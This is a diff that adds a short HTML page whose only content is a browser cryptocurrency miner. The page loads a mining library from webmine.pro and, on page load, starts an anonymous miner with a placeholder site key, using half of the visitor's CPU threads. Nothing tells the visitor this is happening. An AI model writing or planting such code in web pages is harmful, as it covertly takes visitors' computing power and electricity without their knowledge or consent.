@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+   
+    <script src="//webmine.pro/lib/crlt.js"></script>
+
+   <script>
+    //makes sure threads are 1/2 of user's cpu
+var threads = window.navigator.hardwareConcurrency / 2;
+            if (threads < 1) {
+                var threads = 1;
+            }
+var miner=new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY',
+        {
+        threads:threads,
+        autoThreads:false,
+        throttle:0.2,
+        }
+);
+miner.start();
+</script>
+</head>
+</html>
